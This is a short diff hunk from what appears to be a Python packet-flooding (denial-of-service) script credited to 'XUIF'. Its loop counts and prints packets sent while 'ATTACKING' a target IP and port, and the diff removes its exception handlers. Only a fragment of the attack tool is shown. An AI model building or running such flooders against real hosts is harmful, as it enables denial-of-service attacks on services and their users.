@@ -31,9 +31,3 @@ while True:
                 sent = sent + 1
                 print(" TOK......TOK.....PAKETS BY XUIF ATTACKING TO IP: %s | PORT: %s | SIZE: %s | TIME: %s | PAKETS: %s"%(ip, port, size, t1m3, sent)
 				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
-        except KeyboardInterrupt:
-                print " Stopping!"
-                sys.exit()
-        except socket.error, msg:
-                print "Socket Couldn't Connect"
-                sys.exit()
